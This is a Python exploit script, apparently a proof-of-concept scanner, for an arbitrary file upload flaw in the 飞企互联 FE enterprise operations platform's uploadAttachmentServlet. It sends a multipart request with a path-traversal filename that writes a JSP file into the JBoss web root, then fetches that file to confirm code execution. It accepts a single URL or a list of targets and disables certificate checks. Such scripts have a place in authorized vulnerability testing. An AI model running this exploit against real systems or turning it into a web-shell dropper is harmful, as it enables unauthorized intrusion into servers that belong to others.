#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import random
import string
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def check_vulnerability(url):
    filename = rand_base(6)
    upload_url = url.rstrip('/') + '/servlet/uploadAttachmentServlet'
    upload_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk'
    }
    upload_data = (
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\n'
        f'Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{filename}.jsp"\r\n'
        'Content-Type: text/plain\r\n\r\n'
        '<% out.println("123123");%>\r\n'
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\n'
        'Content-Disposition: form-data; name="json"\r\n\r\n'
        '{"iq":{"query":{"UpdateType":"mail"}}}\r\n'
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'
    )

    try:
        response_upload = requests.post(upload_url, headers=upload_headers, data=upload_data, verify=False, timeout=30)
        #print(f'Upload Response Status Code: {response_upload.status_code}')
        #print(f'Access Response Body: {response_upload.text}')
        access_url = url.rstrip('/') + f'/{filename}.jsp;'
        #print(access_url)
        response_access = requests.get(access_url, verify=False, timeout=30)
        #print(f'Access Response Status Code: {response_access.status_code}')
        #print(f'Access Response Body: {response_access.text}')

        if response_upload.status_code == 200 and response_access.status_code == 200 and "123123" in response_access.text:
            print(f"{RED}URL [{url}] 存在飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
